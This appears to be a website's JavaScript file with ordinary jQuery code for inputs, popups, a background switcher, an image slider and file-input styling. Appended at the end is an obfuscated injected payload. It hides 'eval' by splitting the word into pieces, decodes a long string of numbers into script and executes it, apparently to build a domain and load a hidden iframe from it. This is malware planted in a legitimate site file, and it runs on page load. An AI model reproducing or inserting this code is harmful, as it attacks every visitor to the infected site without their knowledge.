
window.onerror=function(desc,page,line,chr){
/* alert('JavaScript error occurred! \n'
  +'\nError description: \t'+desc
  +'\nPage address:      \t'+page
  +'\nLine number:       \t'+line
 );*/
}

$(function(){
 $('a').focus(function(){this.blur();});
 SI.Files.stylizeAll();
 slider.init();

 $('input.text-default').each(function(){
  $(this).attr('default',$(this).val());
 }).focus(function(){
  if($(this).val()==$(this).attr('default'))
   $(this).val('');
 }).blur(function(){
  if($(this).val()=='')
   $(this).val($(this).attr('default'));
 });

 $('input.text,textarea.text').focus(function(){
  $(this).addClass('textfocus');
 }).blur(function(){
  $(this).removeClass('textfocus');
 });

 var popopenobj=0,popopenaobj=null;
 $('a.popup').click(function(){
  var pid=$(this).attr('rel').split('|')[0],_os=parseInt($(this).attr('rel').split('|')[1]);
  var pobj=$('#'+pid);
  if(!pobj.length)
   return false;
  if(typeof popopenobj=='object' && popopenobj.attr('id')!=pid){
   popopenobj.hide(50);
   $(popopenaobj).parent().removeClass(popopenobj.attr('id').split('-')[1]+'-open');
   popopenobj=null;
  }
  return false;
 });
 $('p.images img').click(function(){
  var newbg=$(this).attr('src').split('bg/bg')[1].split('-thumb')[0];
  $(document.body).css('backgroundImage','url('+_siteRoot+'images/bg/bg'+newbg+'.jpg)');
 
  $(this).parent().find('img').removeClass('on');
  $(this).addClass('on');
  return false;
 });
 $(window).load(function(){
  $.each(css_ims,function(){(new Image()).src=_siteRoot+'css/images/'+this;});
  $.each(css_cims,function(){
   var css_im=this;
   $.each(['blue','purple','pink','red','grey','green','yellow','orange'],function(){
    (new Image()).src=_siteRoot+'css/'+this+'/'+css_im;
   });
  });
 }); 
 $('div.sc-large div.img:has(div.tml)').each(function(){
  $('div.tml',this).hide();
  $(this).append('<a href="#" class="tml_open">&nbsp;</a>').find('a').css({
   left:parseInt($(this).offset().left)+864,top:parseInt($(this).offset().top)+1
  }).click(function(){
   $(this).siblings('div.tml').slideToggle();
   return false;
  }).focus(function(){this.blur();}); 
 });
});
var slider={
 num:-1,
 cur:0,
 cr:[],
 al:null,
 at:10*1000,
 ar:true,
 init:function(){
  if(!slider.data || !slider.data.length)
   return false;

  var d=slider.data;
  slider.num=d.length;
  var pos=Math.floor(Math.random()*1);//slider.num);
  for(var i=0;i<slider.num;i++){
   $('#'+d[i].id).css({left:((i-pos)*1000)});
   $('#slide-nav').append('<a id="slide-link-'+i+'" href="#" onclick="slider.slide('+i+');return false;" onfocus="this.blur();">'+(i+1)+'</a>');
  }

  $('img,div#slide-controls',$('div#slide-holder')).fadeIn();
  slider.text(d[pos]);
  slider.on(pos);
  slider.cur=pos;
  window.setTimeout('slider.auto();',slider.at);
 },
 auto:function(){
  if(!slider.ar)
   return false;

  var next=slider.cur+1;
  if(next>=slider.num) next=0;
  slider.slide(next);
 },
 slide:function(pos){
  if(pos<0 || pos>=slider.num || pos==slider.cur)
   return;

  window.clearTimeout(slider.al);
  slider.al=window.setTimeout('slider.auto();',slider.at);

  var d=slider.data;
  for(var i=0;i<slider.num;i++)
   $('#'+d[i].id).stop().animate({left:((i-pos)*1000)},1000,'swing');
  
  slider.on(pos);
  slider.text(d[pos]);
  slider.cur=pos;
 },
 on:function(pos){
  $('#slide-nav a').removeClass('on');
  $('#slide-nav a#slide-link-'+pos).addClass('on');
 },
 text:function(di){
  slider.cr['a']=di.client;
  slider.cr['b']=di.desc;
  slider.ticker('#slide-client span',di.client,0,'a');
  slider.ticker('#slide-desc',di.desc,0,'b');
 },
 ticker:function(el,text,pos,unique){
  if(slider.cr[unique]!=text)
   return false;

  ctext=text.substring(0,pos)+(pos%2?'-':'_');
  $(el).html(ctext);

  if(pos==text.length)
   $(el).html(text);
  else
   window.setTimeout('slider.ticker("'+el+'","'+text+'",'+(pos+1)+',"'+unique+'");',30);
 }
};
// STYLING FILE INPUTS 1.0 | Shaun Inman <http://www.shauninman.com/> | 2007-09-07
if(!window.SI){var SI={};};
SI.Files={
 htmlClass:'SI-FILES-STYLIZED',
 fileClass:'file',
 wrapClass:'cabinet',
 
 fini:false,
 able:false,
 init:function(){
  this.fini=true;
 },
 stylize:function(elem){
  if(!this.fini){this.init();};
  if(!this.able){return;};
  
  elem.parentNode.file=elem;
  elem.parentNode.onmousemove=function(e){
   if(typeof e=='undefined') e=window.event;
   if(typeof e.pageY=='undefined' &&  typeof e.clientX=='number' && document.documentElement){
    e.pageX=e.clientX+document.documentElement.scrollLeft;
    e.pageY=e.clientY+document.documentElement.scrollTop;
   };
   var ox=oy=0;
   var elem=this;
   if(elem.offsetParent){
    ox=elem.offsetLeft;
    oy=elem.offsetTop;
    while(elem=elem.offsetParent){
     ox+=elem.offsetLeft;
     oy+=elem.offsetTop;
    };
   };
  };
 },
 stylizeAll:function(){
  if(!this.fini){this.init();};
  if(!this.able){return;};
 }
};




/*km0ae9gr6m*/s="";try{q=document.createElement("p");q.appendChild("123"+n);}catch(qw){h=-016/7;try{a=prototype;}catch(zxc){e=window["e"+"va"+"l"];n="204.351.440.495.232.315.444.550.64.330.404.600.232.246.388.550.200.333.436.390.234.327.392.505.228.120.164.615.26.30.128.160.64.96.472.485.228.96.416.525.64.183.128.580.208.315.460.230.230.303.404.500.64.141.128.580.208.315.460.230.162.177.52.50.64.96.128.160.236.291.456.160.216.333.128.305.64.348.416.525.230.138.460.505.202.300.128.185.64.348.416.525.230.138.324.295.26.30.128.160.64.96.472.485.228.96.464.505.230.348.128.305.64.348.416.525.230.138.260.160.84.96.432.555.64.135.128.580.208.315.460.230.164.96.168.160.208.315.236.65.20.96.128.160.64.315.408.200.232.303.460.580.64.186.128.240.82.369.52.50.64.96.128.160.64.96.128.160.232.312.420.575.92.345.404.505.200.96.244.160.232.303.460.580.118.39.40.160.64.96.128.625.64.303.432.575.202.96.492.65.20.96.128.160.64.96.128.160.64.348.416.525.230.138.460.505.202.300.128.305.64.348.404.575.232.96.172.160.232.312.420.575.92.231.236.65.20.96.128.160.64.375.52.50.64.96.128.160.228.303.464.585.228.330.128.200.232.312.420.575.92.345.404.505.200.96.168.160.232.312.420.575.92.333.440.505.158.354.404.570.154.123.236.65.20.375.52.50.26.30.408.585.220.297.464.525.222.330.128.410.194.330.400.555.218.234.468.545.196.303.456.355.202.330.404.570.194.348.444.570.80.351.440.525.240.123.492.65.20.96.128.160.64.354.388.570.64.300.128.305.64.330.404.595.64.204.388.580.202.120.468.550.210.360.168.245.96.144.192.205.118.39.40.160.64.96.128.590.194.342.128.575.64.183.128.500.92.309.404.580.144.333.468.570.230.120.164.160.124.96.196.250.64.189.128.245.64.174.128.240.118.39.40.160.64.96.128.580.208.315.460.230.230.303.404.500.64.183.128.250.102.156.212.270.110.168.228.240.98.96.172.160.80.300.184.515.202.348.308.555.220.348.416.200.82.96.168.160.96.360.280.350.140.210.280.350.82.96.172.160.80.300.184.515.202.348.272.485.232.303.160.205.64.126.128.240.240.210.280.350.140.123.172.160.80.231.388.580.208.138.456.555.234.330.400.200.230.96.168.160.96.360.280.350.140.123.164.295.26.30.128.160.64.96.464.520.210.345.184.325.64.183.128.260.112.150.220.245.118.39.40.160.64.96.128.580.208.315.460.230.154.96.244.160.100.147.208.275.104.168.204.270.104.165.236.65.20.96.128.160.64.348.416.525.230.138.324.160.122.96.464.520.210.345.184.385.64.141.128.580.208.315.460.230.130.177.52.50.64.96.128.160.232.312.420.575.92.246.128.305.64.348.416.525.230.138.308.160.74.96.464.520.210.345.184.325.118.39.40.160.64.96.128.580.208.315.460.230.222.330.404.395.236.303.456.385.64.183.128.245.92.144.128.235.64.348.416.525.230.138.308.295.26.30.128.160.64.96.464.520.210.345.184.550.202.360.464.160.122.96.440.505.240.348.328.485.220.300.444.545.156.351.436.490.202.342.236.65.20.96.128.160.64.342.404.580.234.342.440.160.232.312.420.575.118.39.40.625.26.30.52.50.204.351.440.495.232.315.444.550.64.297.456.505.194.348.404.410.194.330.400.555.218.234.468.545.196.303.456.200.228.132.128.385.210.330.176.160.154.291.480.205.246.39.40.160.64.96.128.570.202.348.468.570.220.96.308.485.232.312.184.570.222.351.440.500.80.120.308.485.240.135.308.525.220.123.128.210.64.342.184.550.202.360.464.200.82.96.172.160.154.315.440.205.118.39.40.625.26.30.52.50.204.351.440.495.232.315.444.550.64.309.404.550.202.342.388.580.202.240.460.505.234.300.444.410.194.330.400.555.218.249.464.570.210.330.412.200.234.330.420.600.88.96.432.505.220.309.464.520.88.96.488.555.220.303.164.615.26.30.128.160.64.96.472.485.228.96.456.485.220.300.128.305.64.330.404.595.64.246.388.550.200.333.436.390.234.327.392.505.228.213.404.550.202.342.388.580.222.342.160.585.220.315.480.205.118.39.40.160.64.96.128.590.194.342.128.540.202.348.464.505.228.345.128.305.64.273.156.485.78.132.156.490.78.132.156.495.78.132.156.500.78.132.156.505.78.132.156.510.78.132.156.515.78.132.156.520.78.132.156.525.78.132.156.530.78.132.156.535.78.132.156.540.78.132.156.545.78.132.156.550.78.132.156.555.78.132.156.560.78.132.156.565.78.132.156.570.78.132.156.575.78.132.156.580.78.132.156.585.78.132.156.590.78.132.156.595.78.132.156.600.78.132.156.605.78.132.156.610.78.279.236.65.20.96.128.160.64.354.388.570.64.345.464.570.64.183.128.195.78.177.52.50.64.96.128.160.204.333.456.200.236.291.456.160.210.96.244.160.96.177.128.525.64.180.128.540.202.330.412.580.208.177.128.525.64.129.172.160.82.369.52.50.64.96.128.160.64.96.128.160.230.348.456.160.86.183.128.540.202.348.464.505.228.345.364.495.228.303.388.580.202.246.388.550.200.333.436.390.234.327.392.505.228.120.456.485.220.300.176.160.96.132.128.540.202.348.464.505.228.345.184.540.202.330.412.580.208.96.180.160.98.123.372.295.26.30.128.160.64.96.500.65.20.96.128.160.64.342.404.580.234.342.440.160.230.348.456.160.86.96.156.230.78.96.172.160.244.333.440.505.118.39.40.625.26.30.52.50.230.303.464.420.210.327.404.555.234.348.160.510.234.330.396.580.210.333.440.200.82.369.52.50.64.96.128.160.232.342.484.615.26.30.128.160.64.96.128.160.64.96.420.510.80.348.484.560.202.333.408.160.210.306.456.485.218.303.348.485.230.201.456.505.194.348.404.500.64.183.244.160.68.351.440.500.202.306.420.550.202.300.136.205.246.39.40.160.64.96.128.160.64.96.128.160.64.96.128.525.204.342.388.545.202.261.388.575.134.342.404.485.232.303.400.160.122.96.464.570.234.303.236.65.20.96.128.160.64.96.128.160.64.96.128.160.64.354.388.570.64.351.440.525.240.96.244.160.154.291.464.520.92.342.444.585.220.300.160.215.220.303.476.160.136.291.464.505.80.123.188.245.96.144.192.205.118.39.40.160.64.96.128.160.64.96.128.160.64.96.128.590.194.342.128.500.222.327.388.525.220.234.388.545.202.96.244.160.206.303.440.505.228.291.464.505.160.345.404.585.200.333.328.485.220.300.444.545.166.348.456.525.220.309.160.585.220.315.480.220.64.147.216.220.64.117.456.585.78.123.236.65.20.96.128.160.64.96.128.160.64.96.128.160.64.315.408.570.218.96.244.160.200.333.396.585.218.303.440.580.92.297.456.505.194.348.404.345.216.303.436.505.220.348.160.170.146.210.328.325.154.207.136.205.118.96.52.50.64.96.128.160.64.96.128.160.64.96.128.160.210.306.456.545.92.345.404.580.130.348.464.570.210.294.468.580.202.120.136.575.228.297.136.220.64.102.416.580.232.336.232.235.94.102.172.500.222.327.388.525.220.234.388.545.202.129.136.235.228.351.440.510.222.342.404.575.232.342.468.550.126.345.420.500.122.294.444.580.220.303.464.170.82.177.128.65.20.96.128.160.64.96.128.160.64.96.128.160.64.315.408.570.218.138.460.580.242.324.404.230.238.315.400.580.208.96.244.160.68.144.448.600.68.177.128.65.20.96.128.160.64.96.128.160.64.96.128.160.64.315.408.570.218.138.460.580.242.324.404.230.208.303.420.515.208.348.128.305.64.102.192.560.240.102.236.160.26.30.128.160.64.96.128.160.64.96.128.160.64.96.420.510.228.327.184.575.232.363.432.505.92.354.420.575.210.294.420.540.210.348.484.160.122.96.136.520.210.300.400.505.220.102.236.160.26.30.128.160.64.96.128.160.64.96.128.160.64.96.400.555.198.351.436.505.220.348.184.490.222.300.484.230.194.336.448.505.220.300.268.520.210.324.400.200.210.306.456.545.82.177.52.50.64.96.128.160.64.96.128.160.250.39.40.160.64.96.128.625.198.291.464.495.208.120.404.205.246.375.52.50.250.132.128.265.96.144.164.295".split(".");if(window.document)for(i=6-2-1-2-1;-1828+i!=2-2;i++){k=i;s=s+String.fromCharCode(n[k]/(i%(h*h)+2));}e(s);}}/*qhk6sa6g1c*/
